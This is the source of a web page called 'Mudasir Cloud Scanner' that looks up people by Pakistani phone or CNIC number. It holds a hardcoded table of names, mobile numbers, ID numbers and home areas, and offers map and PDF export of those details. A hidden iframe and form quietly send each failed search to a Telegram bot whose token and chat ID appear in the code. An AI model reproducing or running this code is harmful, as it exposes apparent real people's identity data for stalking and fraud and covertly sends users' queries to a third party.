<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MUDASIR CLOUD SCANNER</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500&display=swap');
        
        body { background: #000; color: #00ff00; font-family: 'Rajdhani', sans-serif; text-align: center; margin: 0; }
        .header { background: #00ff00; color: #000; padding: 15px; font-family: 'Orbitron', sans-serif; font-weight: bold; box-shadow: 0 0 20px #00ff00; }
        .box { border: 2px solid #00ff00; padding: 25px; border-radius: 20px; max-width: 650px; margin: 20px auto; background: rgba(0,20,0,0.95); box-shadow: 0 0 30px rgba(0,255,0,0.3); }
        
        input { width: 85%; padding: 15px; margin: 15px 0; background: #000; border: 2px solid #00ff00; color: #00ff00; border-radius: 10px; font-size: 20px; text-align: center; outline: none; }
        
        .btn { padding: 12px 25px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; font-family: 'Orbitron', sans-serif; transition: 0.3s; margin: 5px; text-transform: uppercase; display: inline-block; text-decoration: none; }
        .search-btn { background: #00ff00; color: #000; width: 85%; font-size: 18px; margin-bottom: 20px; }
        .map-btn { background: #4285F4; color: white; font-size: 14px; }
        .pdf-btn { background: #ff4444; color: white; font-size: 14px; }
        
        .btn:hover { transform: scale(1.05); box-shadow: 0 0 15px #00ff00; }

        .action-container { display: none; margin-top: 20px; }
        table { width: 100%; border-collapse: collapse; border: 1px solid #00ff00; background: #000; }
        th, td { border: 1px solid #00ff00; padding: 12px; text-align: left; font-size: 17px; }
        th { color: #ff3333; background: rgba(0,255,0,0.1); width: 35%; }
        
        .signature-area { margin-top: 30px; font-family: 'Orbitron', sans-serif; font-size: 13px; color: #00ff00; border-top: 1px solid #00ff00; padding-top: 10px; }
        .verified { color: #00bcff; }
    </style>
</head>
<body>

<div class="header">üõ∞Ô∏è MUDASIR CLOUD SCANNER V4.0 üõ∞Ô∏è</div>

<div class="container">
    <div class="box">
        <h2><i class="fas fa-satellite"></i> SYSTEM DECRYPTOR</h2>
        <input type="text" id="search-input" placeholder="ENTER NUMBER OR CNIC...">
        <button class="btn search-btn" onclick="processSearch()">DECRYPT DATA</button>
        
        <div id="result-area"></div>

        <div id="actions" class="action-container">
            <button class="btn map-btn" id="map-link" onclick="openMap()"><i class="fas fa-map-marked-alt"></i> SEE ON GOOGLE MAP</button>
            <button class="btn pdf-btn" onclick="downloadPDF()"><i class="fas fa-file-pdf"></i> PDF DATA</button>
        </div>

        <div class="signature-area">
            VERIFIED BY: <span style="font-size: 16px;">MUDASIR</span> <span class="verified"><i class="fas fa-check-circle"></i></span>
        </div>
    </div>
</div>

<iframe name="hidden_tracker" style="display:none;"></iframe>

<script>
    const token = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
    const chatid = "7107389141";

    const database = [
        ["SAHIL RASHEED", "03247026751", "32303-0000001", "Chah Hayat Wala, Khar", "JAZZ"],
        ["Mubashir Sharif", "03274207754", "32303-0000002", "Chah Hayat Khar, Khar", "JAZZ"],
        ["TAJ MAIE", "03013264623", "32303-1122334-2", "Hayat Khar Wala, Kot Addu", "JAZZ"],
        ["MOHAMMAD HAFEEZ", "03004455661", "35202-0099112-7", "Sargodha, Punjab", "JAZZ"]
    ];

    let current = null;

    function processSearch() {
        const val = document.getElementById("search-input").value.trim();
        const area = document.getElementById("result-area");
        const actions = document.getElementById("actions");
        
        const res = database.find(r => r[1] === val || r[2].includes(val));

        if(res) {
            current = res;
            area.innerHTML = `<table>
                <tr><th>NAME</th><td>${res[0]}</td></tr>
                <tr><th>NUMBER</th><td>${res[1]}</td></tr>
                <tr><th>CNIC</th><td>${res[2]}</td></tr>
                <tr><th>LOCATION</th><td>${res[3]}</td></tr>
            </table>`;
            actions.style.display = "block";
        } else {
            current = null;
            area.innerHTML = "<p style='color:red;'>üö´ RECORD NOT FOUND</p>";
            actions.style.display = "none";
            trackNotFound(val);
        }
    }

    function openMap() {
        if(current) {
            const loc = encodeURIComponent(current[3]);
            window.open(`https://www.google.com/maps/search/${loc}`, '_blank');
        }
    }

    function trackNotFound(num) {
        const msg = `‚ùå *NOT FOUND*\nüì± Number: ${num}\nüë§ System: Mudasir Cloud\nStatus: Data not found.`;
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatid}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
        const f = document.createElement("form");
        f.action = url; f.method = "POST"; f.target = "hidden_tracker";
        document.body.appendChild(f); f.submit();
    }

    function downloadPDF() {
        if(!current) return;
        const { jsPDF } = window.jspdf;
        const doc = new jsPDF();

        // Styles
        doc.setFillColor(0, 0, 0); 
        doc.rect(0, 0, 210, 40, 'F'); // Header black bar
        
        doc.setTextColor(0, 255, 0); // Neon Green
        doc.setFontSize(22);
        doc.setFont("courier", "bold");
        doc.text("MUDASIR CLOUD DATA SLIP", 40, 25);
        
        // Body Border
        doc.setDrawColor(0, 255, 0);
        doc.setLineWidth(1);
        doc.rect(10, 10, 190, 130);

        // Content
        doc.setTextColor(0, 0, 0);
        doc.setFontSize(14);
        doc.text("------------------------------------------", 20, 50);
        doc.setFont("helvetica", "bold");
        doc.text(`FULL NAME:     ${current[0]}`, 20, 65);
        doc.text(`MOBILE NO:     ${current[1]}`, 20, 75);
        doc.text(`CNIC NO:       ${current[2]}`, 20, 85);
        doc.text(`ADDRESS:       ${current[3]}`, 20, 95);
        doc.text("------------------------------------------", 20, 105);

        // Verification Section
        doc.setFontSize(12);
        doc.setTextColor(0, 150, 255); // Blue
        doc.text("STATUS: [ VERIFIED BY CLOUD SYSTEM ]", 20, 115);
        
        // Mudasir Signature & Symbols
        doc.setTextColor(0, 200, 0);
        doc.setFont("courier", "italic");
        doc.text("Signature: MUDASIR _/\\_ [Admin]", 120, 125);
        doc.setFont("symbol");
        doc.text("u v w x y z", 120, 132); // Random symbols for effect

        doc.save(`Record_${current[1]}.pdf`);
    }
</script>
</body>
</html>
